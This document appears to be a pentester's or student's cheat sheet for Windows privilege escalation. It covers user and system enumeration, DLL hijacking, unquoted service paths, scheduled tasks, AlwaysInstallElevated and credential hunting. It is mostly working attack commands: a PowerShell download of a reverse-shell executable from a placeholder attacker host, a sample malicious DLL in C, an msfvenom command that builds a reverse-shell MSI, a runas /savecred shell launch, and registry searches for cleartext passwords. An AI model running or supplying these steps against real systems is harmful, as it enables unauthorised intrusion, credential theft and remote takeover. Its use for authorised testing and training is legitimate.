example of how to download a file using PowerShell:
powershell -c "Invoke-WebRequest -Uri 'http://<LHOST>:<LPORT>/reverse.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

0) Typically, privilege escalation will require you to follow a methodology similar to the one given below: 

  1) Enumerate the current user's privileges and resources it can access.
  2) If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1
  3) If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach


1) Information gathering

User enum
Current userâ€™s privileges: whoami /priv
List users: net users
List details of a user: net user username (e.g. net user Administrator)
Other users logged in simultaneously: qwinsta (the query session command can be used the same way) 
User groups defined on the system: net localgroup
List members of a specific group: net localgroup groupname (e.g. net localgroup Administrators)


System inforoation: systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

Searching files: findstr /si password *.txt

Patch level: wmic qfe get Caption,Description,HotFixID,InstalledOn

Network Connections: netstat -ano

Scheduled tasts: schtasks /query /fo LIST /v

Drivers: driverquery

Antivirus: sc query windefend
sc queryex type=service

Automated tools:
WinPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester


2) Vuln software

wmic product get name,version,vendor

wmic service list brief | findstr "Running"
sc sq SERVICE_NAME

3) DLL Hijacking - The tool you can use to find potential DLL hijacking vulnerabilities is Process Monitor (ProcMon).

If SafeDllSearchMode is enabled, the search order is as follows:

The directory from which the application loaded.
The system directory. Use the GetSystemDirectory function to get the path of this directory.
The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
The current directory.
The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

If SafeDllSearchMode is disabled, the search order is as follows:
The directory from which the application loaded.
The current directory.
The system directory. Use the GetSystemDirectory function to get the path of this directory.
The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.


example of malicious DLL

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}

compile:
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll

restart dllsvc
sc stop dllsvc & sc start dllsvc

4) Unquoted Service Path

Make sure other requirements to exploit the vulnerability are filled such as:
Being able to write to a folder on the path
Being able to restart the service


check for writable privileges of path
.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"


4) Token Impersonation

such as hot potato/rotten potato/etc


5) Quick wins

- scheduled tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or using a binary you can modify.
For this method to work, the scheduled task should be set to run with a user account with a higher privilege level than the one you currently have.

Scheduled tasks can be listed from the command line using the schtasks command, using the task scheduler, or, if possible, uploading a tool such as Autoruns64.exe to the target system.

- always install elevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.


This method requires two registry values to be set. You can query these from the command line using the commands below.

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

Remember, to be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.
If these are set, you can generate a malicious .msi file using msfvenom, as seen below.

msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.

Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell.

Command Run on the Target System
C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi


- Passwords 
We have seen earlier that looking for configuration or user-generated files containing cleartext passwords can be rewarding.
There are other locations on Windows that could hide cleartext passwords.

- Saved credentials

cmdkey /list
runas /savecred /user:admin reverse_shell.exe


- Registry keys:

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

- Unattend files: 

Unattend.xml files helps system administrators setting up Windows systems.
They need to be deleted once the setup is complete but can sometimes be forgotten on the system.
What you will find in the unattend.xml file can be different according to the setup that was done.
If you can find them on a system, they are worth reading.
